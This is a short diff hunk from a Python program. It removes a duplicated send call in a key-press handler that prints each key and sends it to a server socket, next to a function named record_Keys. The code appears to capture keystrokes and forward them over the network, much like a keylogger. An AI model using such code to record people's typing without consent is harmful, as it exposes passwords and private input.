@@ -81,10 +81,6 @@ def on_key(event_or_tag, server_soc):
     client_message = util.generate_message(100, key_name)
     print(f"Key pressed: {key_name}")
     send_message(client_message, server_soc)
-    
-    
-
-    send_message(client_message, server_soc)
 
 def record_Keys(server_soc):
     """
